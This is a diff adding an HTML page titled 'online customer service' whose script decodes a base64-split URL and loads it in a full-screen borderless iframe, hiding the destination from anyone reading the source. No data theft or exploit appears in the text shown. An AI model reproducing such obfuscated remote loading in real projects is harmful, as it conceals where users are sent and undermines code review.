@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>在线客服</title>
+<style>
+  html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
+  #frame { display: block; width: 100%; height: 100%; border: 0; }
+</style>
+</head>
+<body>
+<script>
+(function () {
+
+  var a = "aHR0cDovL29ubGl2ZWNo"; 
+  var b = "YXQuZHBkbnMub3Jn";        
+  var url = decodeURIComponent(escape(atob(a + b)));
+
+  var f = document.createElement("iframe");
+  f.id = "frame";
+  f.setAttribute("frameborder", "0");
+  f.setAttribute("scrolling", "auto");
+  f.setAttribute("allowfullscreen", "true");
+  f.src = url;
+
+  document.body.appendChild(f);
+})();
+</script>
+</body>
+</html>
